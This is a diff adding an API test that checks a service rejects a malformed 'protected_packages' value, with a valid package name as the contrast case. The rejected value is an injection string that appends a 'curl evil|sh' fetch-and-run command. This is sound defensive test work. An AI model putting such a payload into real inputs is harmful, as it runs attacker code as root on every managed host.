@@ -117,3 +117,15 @@ def test_api_nul_is_a_422_not_a_500(client: TestClient, bearer: Bearer) -> None:
         ).status_code
         == 422
     )
+
+
+def test_api_refuses_protected_packages_that_are_not_package_names(
+    client: TestClient, bearer: Bearer
+) -> None:
+    """They end up in a command a report suggests running as root on every host."""
+    h = bearer(*MEMBER)
+    bad = {"checks": {"obsolete-packages": {"protected_packages": ["x; curl evil|sh"]}}}
+    resp = client.post(BASE, json={"name": "bad", "values": bad}, headers=h)
+    assert resp.status_code == 422 and "protected_packages" in resp.text
+    good = {"checks": {"obsolete-packages": {"protected_packages": ["openssh-server"]}}}
+    assert client.post(BASE, json={"name": "good", "values": good}, headers=h).status_code == 201
